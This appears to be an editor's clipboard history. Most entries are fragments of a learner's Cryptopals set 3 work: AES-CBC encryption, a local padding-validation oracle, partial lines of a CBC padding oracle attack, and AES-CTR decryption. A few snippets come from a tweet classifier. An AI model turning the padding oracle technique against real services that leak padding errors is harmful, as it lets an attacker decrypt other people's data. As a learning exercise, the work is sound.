	 MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc=
	MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic=
	MDAwMDAyUXVpY2sgdG8gdGhlIHBvaW50LCB0byB0aGUgcG9pbnQsIG5vIGZha2luZw==
	MDAwMDAzQ29va2luZyBNQydzIGxpa2UgYSBwb3VuZCBvZiBiYWNvbg==
	MDAwMDA0QnVybmluZyAnZW0sIGlmIHlvdSBhaW4ndCBxdWljayBhbmQgbmltYmxl
	MDAwMDA1SSBnbyBjcmF6eSB3aGVuIEkgaGVhciBhIGN5bWJhbA==
	MDAwMDA2QW5kIGEgaGlnaCBoYXQgd2l0aCBhIHNvdXBlZCB1cCB0ZW1wbw==
	MDAwMDA3SSdtIG9uIGEgcm9sbCwgaXQncyB0aW1lIHRvIGdvIHNvbG8=
	MDAwMDA4b2xsaW4nIGluIG15IGZpdmUgcG9pbnQgb2g=
	MDAwMDA5aXRoIG15IHJhZy10b3AgZG93biBzbyBteSBoYWlyIGNhbiBibG93
1b34c084d05a7613d52bf23c8ed97dab|file:///home/neo/cryptopals/set3/set3_sol.py|8|31|v|python
	wTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc
1b34c084d05a7613d52bf23c8ed97dab|file:///home/neo/cryptopals/set3/set3_sol.py|8|31|v|python
	wTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc
a64dbb54639960f2a087404b494c5341|file:///home/neo/cryptopals/set3/set3_sol.py|8|30|v|python
	AwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc
a64dbb54639960f2a087404b494c5341|file:///home/neo/cryptopals/set3/set3_sol.py|8|30|v|python
	AwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc
74816000b2a5d56a71f7bef6bf2a2132|file:///home/neo/cryptopals/set3/set3_sol.py|8|29|v|python
	DAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc
74816000b2a5d56a71f7bef6bf2a2132|file:///home/neo/cryptopals/set3/set3_sol.py|8|29|v|python
	DAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc
d923ae936ee39d071b68962b8b631949|file:///home/neo/cryptopals/set3/set3_sol.py|8|23|v|python
	 MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc
d923ae936ee39d071b68962b8b631949|file:///home/neo/cryptopals/set3/set3_sol.py|8|23|v|python
	 MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc
181aac443490a281063ca438a025a369|file:///home/neo/cryptopals/set3/set3_sol.py|8|23|v|python
	 MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc=
181aac443490a281063ca438a025a369|file:///home/neo/cryptopals/set3/set3_sol.py|8|23|v|python
	 MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc=
7341593cff643ddd36c85d23e39b9952|file:///home/neo/cryptopals/set3/set3_sol.py|9|1|v|python
	MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic
7341593cff643ddd36c85d23e39b9952|file:///home/neo/cryptopals/set3/set3_sol.py|9|1|v|python
	MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic
3afd12fbd952b7236339a1fd80b61753|file:///home/neo/cryptopals/set3/set3_sol.py|9|1|v|python
	MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic=
3afd12fbd952b7236339a1fd80b61753|file:///home/neo/cryptopals/set3/set3_sol.py|9|1|v|python
	MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic=
1958d6ba3844336e0568dba8b66901d9|file:///home/neo/cryptopals/set3/set3_sol.py|10|1|v|python
	MDAwMDAyUXVpY2sgdG8gdGhlIHBvaW50LCB0byB0aGUgcG9pbnQsIG5vIGZha2luZw==
1958d6ba3844336e0568dba8b66901d9|file:///home/neo/cryptopals/set3/set3_sol.py|10|1|v|python
	MDAwMDAyUXVpY2sgdG8gdGhlIHBvaW50LCB0byB0aGUgcG9pbnQsIG5vIGZha2luZw==
df91467b24f9cf3bb7228596ba5904a1|file:///home/neo/cryptopals/set3/set3_sol.py|11|1|v|python
	MDAwMDAzQ29va2luZyBNQydzIGxpa2UgYSBwb3VuZCBvZiBiYWNvbg==
df91467b24f9cf3bb7228596ba5904a1|file:///home/neo/cryptopals/set3/set3_sol.py|11|1|v|python
	MDAwMDAzQ29va2luZyBNQydzIGxpa2UgYSBwb3VuZCBvZiBiYWNvbg==
53d2e875d940b031e995142693d9b13a|file:///home/neo/cryptopals/set3/set3_sol.py|12|1|v|python
	MDAwMDA0QnVybmluZyAnZW0sIGlmIHlvdSBhaW4ndCBxdWljayBhbmQgbmltYmxl
53d2e875d940b031e995142693d9b13a|file:///home/neo/cryptopals/set3/set3_sol.py|12|1|v|python
	MDAwMDA0QnVybmluZyAnZW0sIGlmIHlvdSBhaW4ndCBxdWljayBhbmQgbmltYmxl
3eceba050609e3da583e7d550e80293e|file:///home/neo/cryptopals/set3/set3_sol.py|13|1|v|python
	MDAwMDA1SSBnbyBjcmF6eSB3aGVuIEkgaGVhciBhIGN5bWJhbA==
3eceba050609e3da583e7d550e80293e|file:///home/neo/cryptopals/set3/set3_sol.py|13|1|v|python
	MDAwMDA1SSBnbyBjcmF6eSB3aGVuIEkgaGVhciBhIGN5bWJhbA==
85f4b9eb1a288dd0e5fbd0948e668a83|file:///home/neo/cryptopals/set3/set3_sol.py|14|1|v|python
	MDAwMDA2QW5kIGEgaGlnaCBoYXQgd2l0aCBhIHNvdXBlZCB1cCB0ZW1wbw==
85f4b9eb1a288dd0e5fbd0948e668a83|file:///home/neo/cryptopals/set3/set3_sol.py|14|1|v|python
	MDAwMDA2QW5kIGEgaGlnaCBoYXQgd2l0aCBhIHNvdXBlZCB1cCB0ZW1wbw==
c3915ad4654a638d19879f134dc131af|file:///home/neo/cryptopals/set3/set3_sol.py|15|1|v|python
	MDAwMDA3SSdtIG9uIGEgcm9sbCwgaXQncyB0aW1lIHRvIGdvIHNvbG8=
3a0639989fe0291560c7add4097a8d15|file:///home/neo/cryptopals/set3/set3_sol.py|16|1|v|python
	MDAwMDA4b2xsaW4nIGluIG15IGZpdmUgcG9pbnQgb2g=
3a0639989fe0291560c7add4097a8d15|file:///home/neo/cryptopals/set3/set3_sol.py|16|1|v|python
	MDAwMDA4b2xsaW4nIGluIG15IGZpdmUgcG9pbnQgb2g=
6db1567487efe33e9d5c0f82d3ce7f59|file:///home/neo/cryptopals/set3/set3_sol.py|17|1|v|python
	MDAwMDA5aXRoIG15IHJhZy10b3AgZG93biBzbyBteSBoYWlyIGNhbiBibG93]
6db1567487efe33e9d5c0f82d3ce7f59|file:///home/neo/cryptopals/set3/set3_sol.py|17|1|v|python
	MDAwMDA5aXRoIG15IHJhZy10b3AgZG93biBzbyBteSBoYWlyIGNhbiBibG93]
2e4fc2400be3afafb1287c876fbda0d0|file:///home/neo/cryptopals/set3/set3_sol.py|22|5|V|python
	    iv
912bba3cb763966156c2c4645638af33|file:///home/neo/cryptopals/set3/set3_sol.py|6|1|V|python
	from typing import Callable
e7ec8c764c14052081ca68da9245c3fb|file:///home/neo/cryptopals/set3/set3_sol.py|21|5|V|python
	    TypeError
1a718a08c1d020ced6f3c9d6c9a7a5e3|file:///home/neo/cryptopals/set3/set3_sol.py|32|17|v|python
	ncrypt_aes_cbc
92ae25c8a78a9f9e034d9fd6ce6d2257|file:///home/neo/cryptopals/set3/set3_sol.py|33|5|V|python
	    iv = generate_random_bytes(16)
0c3ed53b5191f31fc976e3b0c8400a5c|file:///home/neo/cryptopals/set3/set3_sol.py|18|41|v|python
	, iv: bytes
3bdfb5d1c751db2914a7f8dae11e8d71|file:///home/neo/cryptopals/set3/set3_sol.py|37|50|v|python
	, iv
1f787626b6b4995022bc4ec4d029198b|file:///home/neo/cryptopals/set3/set3_sol.py|19|34|v|python
	 or not isinstance(iv, bytes)
327cf302ff736620a65308383576d072|file:///home/neo/cryptopals/set3/set3_sol.py|38|5|V|python
	    print(encrypted)
9c069009daffd3e477a39f8d3e6f2fbb|file:///home/neo/cryptopals/set3/set3_sol.py|42|1|V|python
	    print(valid)
9f7d0ee82b6a6ca7ddeae841f3253059|file:///home/neo/cryptopals/set3/set3_sol.py|37|12|v|python
	valid
b3638c5492d3c8cb3962ddb9a8d197fe|file:///home/neo/cryptopals/set3/set3_sol.py|47|5|V|python
	    key 
9aec0bedec7f5f62067cce994fbece66|file:///home/neo/cryptopals/set3/set3_sol.py|21|2|V|python
	    if not isinstance(key, bytes):
	        raise TypeError
08bc8c7e60cc027fe0736186051db230|file:///home/neo/cryptopals/set3/set3_sol.py|20|31|v|python
	key: bytes
117a2db618f68b2aead8cb3f297ebc20|file:///home/neo/cryptopals/set3/set3_sol.py|39|31|v|python
	encryption_function: Callable
3f2ffecdedca7b6588298f72c3ec7d5f|file:///home/neo/cryptopals/set3/set3_sol.py|40|23|v|python
	encryption_function, Callable
4f0fd1e6971b8c13e94cb9829ca9e36a|file:///home/neo/cryptopals/set3/set3_sol.py|47|5|V|python
	    valid = decrypt_and_validate_padding(encrypted, iv)
84423269606f491b0d6f28946ba59d3d|file:///home/neo/cryptopals/set3/set3_sol.py|45|13|V|python
	            fake_block = 
6520a029736d6cb071d976eb333c849a|file:///home/neo/cryptopals/set3/set3_sol.py|47|13|V|python
	            fake_block[pos] = byte
24d3999b121c09b2c44faa23e72fd0b3|file:///home/neo/cryptopals/set3/set3_sol.py|52|26|v|python
	change ^ byte = original_byte
f796067e16931c28b88f39a55c24bab2|file:///home/neo/cryptopals/set3/set3_sol.py|47|13|V|python
	            change = byte ^ original_byte
332e20a5843e9c0de44d8bf598a17dcd|file:///home/neo/cryptopals/set3/set3_sol.py|51|17|V|python
	                target ^ byte = correct_pad_byte
789218c42b1035d930cb95ee6807a0a3|file:///home/neo/cryptopals/set3/set3_sol.py|47|9|V|python
	        original_byte = first_block[pos]
ebea10893855c2913bf8dc2072100c13|file:///home/neo/cryptopals/set3/set3_sol.py|65|1|V|python
	    first_block = ciphertext[0:block_size]
0def57c3dd60961e92a0748c83f9e73b|file:///home/neo/cryptopals/set3/set3_sol.py|51|13|V|python
	            fake_block = bytes(fake_block)
dd9b139dc793a876ef55beaab47efc5a|file:///home/neo/cryptopals/set3/set3_sol.py|48|13|V|python
	            print(i)
baa54782bd6a8902f70422d5c6af63be|file:///home/neo/cryptopals/set3/set3_sol.py|47|9|V|python
	        print(fake_block)
a67ea527e900e10363887ef943630d35|file:///home/neo/cryptopals/set3/set3_sol.py|48|13|V|python
	            print(block_size - i)
57d1fbf75981ce28980bfb23331d9ece|file:///home/neo/cryptopals/set3/set3_sol.py|48|13|V|python
	            print(block_size - i - 1)
54aa6740a75bb0cfb7f65767b55c317a|file:///home/neo/cryptopals/set3/set3_sol.py|53|17|V|python
	                print('valid')
6e2261ec53d58bb80a082f2fe83b911c|file:///home/neo/cryptopals/set3/set3_sol.py|43|23|v|python
	bytearray()
a8fc79bbf567fa5f54269ff89d825e9b|file:///home/neo/cryptopals/set3/set3_sol.py|54|17|v|python
	decrypted_block[block_size - pos - 1] 
e4c30d4279350897834bb5cd236bc014|file:///home/neo/cryptopals/set3/set3_sol.py|55|17|V|python
	                print(block_size - pos - 1)
656ac62dc9ad72e2f328b96a1c79828a|file:///home/neo/cryptopals/set3/set3_sol.py|55|17|V|python
	                print(decrypted_block[block_size - pos - 1])
da930d1394b52ea3e8ba66f529feff57|file:///home/neo/cryptopals/set3/set3_sol.py|55|17|V|python
	                print(valid)
8b56e7d7e0948e8b719a03888bc29757|file:///home/neo/cryptopals/set3/set3_sol.py|44|5|V|python
	    print(decrypted_block)
64ead5c1d962e30e150b841d626f3fdd|file:///home/neo/cryptopals/set3/set3_sol.py|50|12|V|python
	            print(correct_pad_byte)
5f7f6839bd373b86cb958cc1b5aa461e|file:///home/neo/cryptopals/set3/set3_sol.py|46|9|V|python
	        print('teset')
1118d49eab8a1f6badbf387b310585ef|file:///home/neo/cryptopals/set3/set3_sol.py|45|9|V|python
	        print(pos)
4cb39f5258ce64fb3a722d79f73393d0|file:///home/neo/cryptopals/set3/set3_sol.py|45|9|V|python
	        print(decrypted_block)
a5bde7c4f6a7d574eea8207c28276c09|file:///home/neo/cryptopals/set3/set3_sol.py|52|13|V|python
	            print(block_size - pos - 1)
93d7a3f623efde2ed9f879084a5d9cf0|file:///home/neo/cryptopals/set3/set3_sol.py|46|9|V|python
	        print(correct_pad_byte)
3286945fc5eb1dd742d1da64d10a9e13|file:///home/neo/cryptopals/set3/set3_sol.py|48|9|V|python
	        print(first_block)
a449be0d4a26c7ccf63bd6ff768e41b1|file:///home/neo/cryptopals/set3/set3_sol.py|48|9|V|python
	        print(hex(original_byte))
0dd211d17c4bea8a6038309eac34a46c|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|64|1|V|python
	if 'add_keywords' in sys.argv:
		add_keywords = True
		print('add keywords')
efcde7fd79a38c4568e927e06476981b|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|72|1|V|python
	num_neighbours = 3
d7ae3513fb017bea4aae17eb6bfaf008|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|72|18|V|python
	num_neighbours = 3
	k_weights = 'distance'
	k_alg = 'brute'
4dc2c4e74d32facb087cbf8c1a5e39ad|file:///home/neo/cryptopals/set3/set3_sol.py|57|1|V|python
	    print(bytes(decrypted_block))
bbee1acce6c5c84dfb9f9150f2ee8212|file:///home/neo/cryptopals/set3/set3_sol.py|48|9|V|python
	        if i != 0:
3e3e980b61cbdadda31157f593f083db|file:///home/neo/cryptopals/set3/set3_sol.py|48|9|V|python
	        if pos > 0:
88a40627c3119cfee5a948d7108988f0|file:///home/neo/cryptopals/set3/set3_sol.py|58|17|V|python
	                print((decrypted_block))
8901be344752727f60ad26c6e7b6f871|file:///home/neo/cryptopals/set3/set3_sol.py|50|1|V|python
	            fake_block[block_size - i - 1] ^= decrypted_block[block_size - i - 1] ^ correct_pad_byte
8be1df608754a71ab3b44352198d0107|file:///home/neo/cryptopals/set3/set3_sol.py|50|82|v|python
	 ^ correct_pad_byte
2f857b50a15bd758c73f840cdfb5ca7a|file:///home/neo/cryptopals/set3/set3_sol.py|49|13|v|python
	fake_block[block_size
af9cb54607bb19b6740ccade879bd94a|file:///home/neo/cryptopals/set3/set3_sol.py|49|13|v|python
	fake_block[block_size - i - 1] 
48e0059a3bd10c90ea471bc6b8dfcd17|file:///home/neo/cryptopals/set3/set3_sol.py|50|1|V|python
	            print(fake_block[block_size - i - 1] )
e1410113823ceadadd373109f8870735|file:///home/neo/cryptopals/set3/set3_sol.py|50|1|V|python
	            print(fake_block[block_size - i - 1])
56cb1974291122da75770238966274f1|file:///home/neo/cryptopals/set3/set3_sol.py|52|9|V|python
	        print(block_size - pos - 1)
c4f4b453a72fa53b08f5f8db6640cac6|file:///home/neo/cryptopals/set3/set3_sol.py|45|5|V|python
	        print('-------------------\n')
f5421cf418a273fb93290b38a83f4643|file:///home/neo/cryptopals/set3/set3_sol.py|58|1|V|python
	                decrypted_block[block_size - pos - 1] = target
f730071264de8a240e0025caf4ff9437|file:///home/neo/cryptopals/set3/set3_sol.py|60|13|V|python
	            decrypted_block[block_size - pos - 1] = 61
a4e270b867446deec62db31cc9277540|file:///home/neo/cryptopals/set3/set3_sol.py|59|5|V|python
	                break
c9d4773505482f4bbba0647ab2ea7b02|file:///home/neo/cryptopals/set3/set3_sol.py|73|9|V|python
	        print(decrypted)
56ad205784e0d9dd1bfc3f692affe175|file:///home/neo/cryptopals/set3/set3_sol.py|78|1|V|python
	        print(second_block)
fac343ad383d3a51b0dee243f3bacfa4|file:///home/neo/cryptopals/set3/set3_sol.py|72|5|V|python
	    print(second_block)
5f0b7b3cc2e78243cc7d25671b0dcd95|file:///home/neo/cryptopals/set3/set3_sol.py|70|5|V|python
	    print(first_block)
110547b737ad21d11f76fbcdd8b1d5ab|file:///home/neo/cryptopals/set3/set3_sol.py|72|11|v|python
	first_block
b3b4559d9039210a27fb68a7cee82398|file:///home/neo/cryptopals/set3/set3_sol.py|72|1|V|python
	    print(first_block)
	    print(second_block)
11afe56525478d120dbc5e992de4361d|file:///home/neo/cryptopals/set3/set3_sol.py|78|26|V|python
	        print(first_block)
	        print(second_block)
f2b529916343a0da10dd7f52342fdbe7|file:///home/neo/cryptopals/set3/set3_sol.py|72|1|V|python
	    print('first block: ', first_block)
	    print('second block: 'second_block)
07c73021a68b1918f4240d11157092cb|file:///home/neo/cryptopals/set3/set3_sol.py|77|9|V|python
	        print()
1214d200e9d29193e975591e44eb0da8|file:///home/neo/cryptopals/set3/set3_sol.py|59|5|V|python
	    # print(bytes(decrypted_block))
13c290f1b2c68595041884259008c82d|file:///home/neo/cryptopals/set3/set3_sol.py|70|7|V|python
	    print(ciphertext)
	    print('first block: ', first_block)
	    print('second block: ', second_block)
64866c36f322afaf2df7820c8ef3a450|file:///home/neo/cryptopals/set3/set3_sol.py|74|5|V|python
	        print('first block: ', first_block)
	        print('second block: ', second_block)
ce582d8d9658aba9ec5e44bc14b132aa|file:///home/neo/cryptopals/set3/set3_sol.py|71|1|V|python
	        print(ciphertext)
b1c5339c8d252b646849b5f66214486a|file:///home/neo/cryptopals/set3/set3_sol.py|71|5|V|python
	        print(ciphertext)
	        decrypted += decrypt_block_padding_oracle(first_block, second_block, iv)
bbe2ccffb098d5a83d1f87f8b76f89da|file:///home/neo/cryptopals/set3/set3_sol.py|71|1|V|python
	        decrypted += decrypt_block_padding_oracle(first_block, second_block, iv)
ad499dc1ad92ab228ac916374a59f13a|file:///home/neo/cryptopals/set3/set3_sol.py|68|1|V|python
	    # first_block = ciphertext[0:block_size]
2fc7bda32e1fc320f074af7d4f755660|file:///home/neo/cryptopals/set3/set3_sol.py|70|22|v|python
	ciphertext[block_size:2 * block_size]
47ea054d7bc562ecc9df6351bdb9c980|file:///home/neo/cryptopals/set3/set3_sol.py|72|5|V|python
	    decrypted += decrypt_block_padding_oracle(first_block, second_block, iv)
3ff4e743df022f4084bea5ed23c99930|file:///home/neo/cryptopals/set3/set3_sol.py|68|5|V|python
	    first_block = b'a' * 16
	    second_block = ciphertext[0:block_size]
994bf13fd87f5e77c3deff2f251013a5|file:///home/neo/cryptopals/set3/set3_sol.py|71|9|V|python
	        print(i)
bc422a2c0350652725301619fe3e56a3|file:///home/neo/cryptopals/set3/set3_sol.py|56|17|V|python
	                # print('Pos: ', pos, ' valid')
de2559858a0de40615dee08bdd870ad7|file:///home/neo/cryptopals/set3/set3_sol.py|45|9|V|python
	        # print('Pos: ', pos)
55263fe0ba6f21794e079310f9d63fc5|file:///home/neo/cryptopals/set3/set3_sol.py|69|24|V|python
	        first_block = second_block
	        second_block = ciphertext[(i+1) * block_size: (i+2) * block_size]
56c0964802f1ada6afe7d448bab74b43|file:///home/neo/cryptopals/set3/set3_sol.py|69|24|v|python
	ciphertext[(i+1) * block_size: (i+2) * block_size]
83339841a3c9b6f3cb249fa5a9b7e3c8|file:///home/neo/cryptopals/set3/set3_sol.py|65|20|V|python
	    first_block = ciphertext[0:block_size]
	    second_block = ciphertext[block_size:2 * block_size]
93185c10a3ea9c54a2a7fa01609c8175|file:///home/neo/cryptopals/set3/set3_sol.py|1|1|V|python
	#!/usr/bin/python3
	from set1.set1_sol import * 
	from set2.set2_sol import * 
	import random
	import string
	from typing import Callable
	
	key = generate_random_bytes(16)
	strings_to_encrypt = [b'MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc='
	b'MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic=',
	b'MDAwMDAyUXVpY2sgdG8gdGhlIHBvaW50LCB0byB0aGUgcG9pbnQsIG5vIGZha2luZw==',
	b'MDAwMDAzQ29va2luZyBNQydzIGxpa2UgYSBwb3VuZCBvZiBiYWNvbg==',
	b'MDAwMDA0QnVybmluZyAnZW0sIGlmIHlvdSBhaW4ndCBxdWljayBhbmQgbmltYmxl',
	b'MDAwMDA1SSBnbyBjcmF6eSB3aGVuIEkgaGVhciBhIGN5bWJhbA==',
	b'MDAwMDA2QW5kIGEgaGlnaCBoYXQgd2l0aCBhIHNvdXBlZCB1cCB0ZW1wbw==',
	b'MDAwMDA3SSdtIG9uIGEgcm9sbCwgaXQncyB0aW1lIHRvIGdvIHNvbG8=',
	b'MDAwMDA4b2xsaW4nIGluIG15IGZpdmUgcG9pbnQgb2g=',
	b'MDAwMDA5aXRoIG15IHJhZy10b3AgZG93biBzbyBteSBoYWlyIGNhbiBibG93' ]
	
	def encrypt_random_string_cbc() -> bytes:
	    iv = generate_random_bytes(16)
	    rand_pos = random.randint(0, len(strings_to_encrypt) - 1)
	    string = strings_to_encrypt[rand_pos]
	    string = base64.b64decode(string)
	    string = pkcs7_pad(string, 16)
	    encrypted = encrypt_aes_cbc(string, key, iv)
	    return encrypted, iv
	
	def decrypt_and_validate_padding(ciphertext: bytes, iv: bytes) -> bool:
	    if not isinstance(ciphertext, bytes) or not isinstance(iv, bytes):
	        raise TypeError
	    plaintext = decrypt_aes_cbc(ciphertext, key, iv)
	    try: 
	        pkcs7_pad_validate(plaintext)
92b7e63edefa17e7e26253cd522d789b|file:///home/neo/cryptopals/set2/set2_sol.py|23|1|V|python
	            raise Exception('Incorrect PKCS7 padding')
f9d74ad1bcfdaec15d3ee57a22cb7f1e|file:///home/neo/cryptopals/set3/set3_sol.py|52|1|V|python
	            # fake_block[block_size - pos - 1] = original_byte ^ byte
e038d1fe93c82a6c9bb4ff64d87074a7|file:///home/neo/cryptopals/set3/set3_sol.py|56|1|V|python
	                target = byte ^ correct_pad_byte
4411fb0784d874bcdfeaa9c8bf1c9405|file:///home/neo/cryptopals/set3/set3_sol.py|58|1|V|python
	            print('No valid')
1a808016e356bdf3d42d63f38cba745c|file:///home/neo/cryptopals/set3/set3_sol.py|52|1|V|python
	            fake_block[block_size - pos - 1] = original_byte ^ byte
47ead7421a93cb2c0eed0270cc311152|file:///home/neo/cryptopals/set3/set3_sol.py|53|48|v|python
	original_byte ^ 
988ed5feffd0d5661586974cc30df706|file:///home/neo/cryptopals/set3/set3_sol.py|68|9|V|python
	        print('--------------\n')
678dec418576d98d8d6092c25e19d8b1|file:///home/neo/cryptopals/set2/set2_sol.py|284|1|V|python
	    unpadded = pkcs7_pad_validate(b"ICE ICE BABY\x04\x04\x04\x04")
061e6db03cc2143d7c146c057b85a7a4|file:///home/neo/cryptopals/set2/set2_sol.py|285|53|^v|python
	\x10"
f0011b0caf2c677f0edd7c4b4281c637|file:///home/neo/cryptopals/set2/set2_sol.py|285|53|^v|python
	\x10\x10"
602bf6e845092754778f7c6bc19cff4a|file:///home/neo/cryptopals/set2/set2_sol.py|285|53|^v|python
	\x10\x10\x10\x10"
b63ce389f6352dc4cba44b7769e951e0|file:///home/neo/cryptopals/set2/set2_sol.py|285|53|^v|python
	\x10\x10\x10\x10\x10\x10\x10\x10"
52982ef3f76cb3264cdb15f4615e5fbb|file:///home/neo/cryptopals/set2/set2_sol.py|285|53|^v|python
	\x11\x11
7209be70f1b1548022c6535bd73de402|file:///home/neo/cryptopals/set3/set3_sol.py|77|1|V|python
	    # decrypted = attack_padding_oracle_cbc(encrypted, iv)
09bd5f4435ca3af25ef648ccfd33277d|file:///home/neo/cryptopals/set3/set3_sol.py|78|17|v|python
	attack_padding_oracle_cbc(encrypted, iv)
1f73b35b130e7b6dc85122ed008e15a3|file:///home/neo/cryptopals/set3/set3_sol.py|78|5|V|python
	    decrypted = decrypt_and_validate_padding(encrypted, iv)
c48748843adea5cf95c1126812e10563|file:///home/neo/cryptopals/set3/set3_sol.py|65|5|V|python
	    blocks = len(ciphertext) // block_size
df545cc48e257cb29985360e255c3234|file:///home/neo/cryptopals/set3/set3_sol.py|66|3|V|python
	   rint(ciphertext)
b436b7cf9c3bdb31ce7019f118c94529|file:///home/neo/cryptopals/set3/set3_sol.py|75|1|V|python
	    decrypted = attack_padding_oracle_cbc(encrypted, iv)
	    print(decrypted)
97ac13851ba58046ac9fc3c2131e29af|file:///home/neo/cryptopals/set3/set3_sol.py|77|17|v|python
	decrypt_and_validate_padding(encrypted, iv)
29de04de81d977a5681bad9a6ee99554|file:///home/neo/cryptopals/set3/set3_sol.py|57|17|V|python
	                if target < 16:
1cbfb724ceee46cd879df7c7cfbe7dca|file:///home/neo/cryptopals/set3/set3_sol.py|57|17|v|python
	break
0813070897e3f5645cd62e7b8adf552e|file:///home/neo/cryptopals/set3/set3_sol.py|57|17|V|python
	                if target <= block_size:
7aa28ed115707345d0274032757e8991|file:///home/neo/cryptopals/set3/set3_sol.py|57|17|v|python
	continue
71e38ad4b643ccf8ec8cf9352f020df3|file:///home/neo/cryptopals/set3/set3_sol.py|52|13|V|python
	            print(byte)
ebe026e682da3a29024a6d4efd3ae10b|file:///home/neo/cryptopals/set3/set3_sol.py|59|13|V|python
	            # print('Not valid')
dbfa7e4839903fff44bfbf4048c2f605|file:///home/neo/cryptopals/set3/set3_sol.py|72|1|V|python
	if __name__ == '__main__':
	    # Challenge 18
	    encrypted = L77na/nrFsKvynd6HzOoG7GHTLXsTVu9qvY/2syLXzhPweyyMTJULu/6/kXX0KSvoOLSFQ==
7a64c1328941190551bd9f467bfbad9e|file:///home/neo/cryptopals/set3/set3_sol.py|74|16|v|python
	 L77na/nrFsKvynd6HzOoG7GHTLXsTVu9qvY/2syLXzhPweyyMTJULu/6/kXX0KSvoOLSFQ==
7a64c1328941190551bd9f467bfbad9e|file:///home/neo/cryptopals/set3/set3_sol.py|74|16|v|python
	 L77na/nrFsKvynd6HzOoG7GHTLXsTVu9qvY/2syLXzhPweyyMTJULu/6/kXX0KSvoOLSFQ==
daaa9b143c61117e97479f166b92ee2e|file:///home/neo/cryptopals/set3/set3_sol.py|82|5|V|python
	    struct.pack('<Q', 1)
e7624dfd3ab6a2772c3bb101c7c93ce9|file:///home/neo/cryptopals/set3/set3_sol.py|80|1|V|python
	        keystream_block = encrypt_aes_ecb(nonce + struct.pack('<Q', counter), key)
a1424ba32c97890f524f3045f6c02b48|file:///home/neo/cryptopals/set3/set3_sol.py|82|1|V|python
	        decrypted += xor_bytes(to_decrypt, keystream_block)
2322f293a3abc3ed560646636edf72ae|file:///home/neo/cryptopals/set3/set3_sol.py|81|43|v|python
	nonce + struct.pack('<Q'
88edb152b32ebff0f40a2e01b1e53b99|file:///home/neo/cryptopals/set3/set3_sol.py|80|1|V|python
	        print(nonce + struct.pack('<Q', counter))
9c1204b71b76ce282eece6045895bd74|file:///home/neo/cryptopals/set3/set3_sol.py|80|49|V|python
	        # print(nonce + struct.pack('<Q', counter))
	        # print(len(nonce + struct.pack('<Q', counter)))
f0e71c31a29fbcf48fe730f99673fc20|file:///home/neo/cryptopals/set2/set2_sol.py|350|5|v|python
	# print(ciphertext)
141ed774fff71bfe6d2c32e358df0f49|file:///home/neo/cryptopals/set1/set1_sol.py|234|1|V|python
	    # ct = bytes.fromhex('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736')
	    # output = single_byte_xor(ct, 100)
	    # print(output)
5312ac265b97a62e0aa1c7aedc1a0f7a|file:///home/neo/cryptopals/set1/set1_sol.py|234|1|V|python
	    # ct = bytes.fromhex('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736')
18f715204a24477c76902926ddc16dd1|file:///home/neo/cryptopals/set3/set3_sol.py|71|1|V|python
	def decrypt_aes_ctr(ciphertext: bytes, key: bytes, nonce: bytes):
	    if not isinstance(ciphertext, bytes) or not isinstance(key, bytes) or not isinstance(nonce,bytes):
	        raise TypeError
	    counter = 0
	    block_size = 16
	    decrypted = b''
	    blocks = len(ciphertext) // block_size
	    for i in range(blocks):
	        to_decrypt = ciphertext[i * block_size: (i+1) * block_size]
	        keystream_block = encrypt_aes_ecb(nonce + struct.pack('<Q', counter), key)
	        counter += 1
	        decrypted += xor_bytes(to_decrypt, keystream_block)
	    excess = len(ciphertext) - blocks * block_size
	    to_decrypt = ciphertext[-excess:]
	    keystream_block = encrypt_aes_ecb(nonce + struct.pack('<Q', counter), key)
	    decrypted += xor_bytes(to_decrypt, keystream_block[:excess])
	    return decrypted
c641cd46c0f06bf5b71748bc16344955|file:///home/neo/cryptopals/set3/set3_sol.py|111|1|V|python
	    decrypted = decrypt_aes_ctr(encrypted, key, b'\x00' * 8)
9622555687db2ce17718931eb564adc8|file:///home/neo/Documents/epl448/disaster-tweets/svc_classifier.py|49|13|v|python
	igmoid
9622555687db2ce17718931eb564adc8|file:///home/neo/Documents/epl448/disaster-tweets/svc_classifier.py|49|13|v|python
	igmoid
c66746849a2becff7053d87bf6dd71f8|file:///home/neo/Documents/epl448/disaster-tweets/svc_classifier.py|49|14|v|python
	gmoid
c66746849a2becff7053d87bf6dd71f8|file:///home/neo/Documents/epl448/disaster-tweets/svc_classifier.py|49|14|v|python
	gmoid
accc4a6aef7653498bcf65507244b7f5|file:///home/neo/Documents/epl448/disaster-tweets/svc_classifier.py|49|12|v|python
	sigmoid
